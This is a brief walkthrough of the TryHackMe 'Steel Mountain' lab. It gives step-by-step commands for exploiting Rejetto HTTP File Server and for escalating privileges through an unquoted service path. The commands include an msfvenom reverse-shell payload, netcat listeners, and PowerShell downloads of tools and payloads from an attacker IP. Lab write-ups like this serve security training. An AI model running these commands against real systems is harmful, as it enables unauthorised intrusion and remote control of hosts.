# Writeup for [Steel Mountain](https://tryhackme.com/room/steel-mountain)

```
set -gx IP 10.10.156.23
```


## Task 1: Introduction

* visit $IP in browser


## Task 2: Initial Access

* new default nmap scan `nmap -sV -A -Pn $IP`
  * -sV: Probe open ports to determine service info
  * -A: Enable OS detection
  * -Pn: no ping
* visit found port in browser $IP:<port>
* search & use found exploit within msfconsole `search rejetto http file server`
* set necessary options (`RHOSTS, RPORT, LHOST, LPORT`)
* run `exploit`


## Task 3: Priviledge Escalation

* upload PowerUp `upload PowerUp.ps1`
* load powershell module `load powershell`
* run powershell `powershell_shell`
* create reverse shell with `msfvenom -p windows/shell_reverse_tcp LHOST=10.8.60.141 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
* upload it and store in folder `C:/Program Files (x86)/IObit/`
* start local listener `nc -lnvp 4443`
* (re)start service `sc stop AdvancedSystemCareService9 & sc start AdvancedSystemCareService9`
* find & cat root flag `type C:\Users\Administrator\Desktop\root.txt`


## Task 4: Access and Escalation Without Metasploit

* download exploit and modify ip_addr and port
* run with `python2 ./39161.py $IP 8080` twice
* start webserver `python3 -m http.server 80`
* start nc listener `nc -lnvp 8889`
* download winPEAS `powershell -c "Invoke-WebRequest -Uri http://10.8.60.141/winPEASx86.exe -OutFile winPEAS.exe"`
* run winPeas `.\winPEAS.exe`
* search for "unquoted paths"
* cd to unquoted path `cd "C:\Program Files (x86)\IObit\"`
* download exploit created with msfvenom ( `msfvenom -p windows/shell_reverse_tcp LHOST=10.8.60.141 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`) `powershell -c "Invoke-WebRequest -Uri http://$MY-IP/Advanced.exe -OutFile Advanced.exe"`
* (re)start service `sc stop AdvancedSystemCareService9 & sc start AdvancedSystemCareService9`
* run `whoami` to confirm root access
